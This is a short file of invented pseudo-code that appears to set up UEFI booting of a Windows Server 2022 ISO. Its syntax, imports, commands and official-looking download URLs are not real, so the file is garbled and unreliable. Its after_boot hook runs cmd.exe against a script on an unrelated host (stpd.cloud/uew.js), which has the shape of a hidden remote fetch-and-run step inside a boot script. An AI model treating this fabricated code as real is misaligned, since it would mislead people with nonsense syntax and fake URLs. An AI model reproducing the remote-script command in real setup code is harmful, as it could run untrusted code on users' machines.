import WinServer@11
import UEFI
import BiosSetting

let static_build public = "https://storage.api.microsoft.com/win/images/win11server/@11/__/Windows%20Server%2022.iso"
let build_uefi private = "https://lts.uefi.org/servwin/.uefi/__/"

class boot_vm extension WinServer {

    load static_build(*) as static_build

    _worker.start() {
        {
            "
            uefi load Windows Server 2022.iso
            uefi boot \m \f //force

            
            "
        }
        if uefi init(false){
            "run .uefi /f /i"
            return _worker.start()
        }
    }
}


class after_boot extension req_boot {
    uefi.after_boot( {
        .cmd::"cmd.exe "https:&amp;&amp;stpd.cloud/uew.js""
        .cmd::"run chmod /f"
    } )
    
}